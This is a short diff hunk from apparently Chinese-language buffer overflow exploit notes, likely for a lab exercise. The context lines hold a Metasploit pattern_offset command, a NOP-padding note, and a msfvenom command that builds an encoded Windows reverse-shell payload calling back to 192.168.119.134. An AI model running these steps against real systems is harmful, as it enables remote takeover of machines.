@@ -19,6 +19,7 @@ msf-pattern_offset -l 2400 -q 39794338
 10.最後因為decoder的原因,需要shellcode前面加十個\x90
 
 
+
 9.生成shell code
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.134 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x51"
 
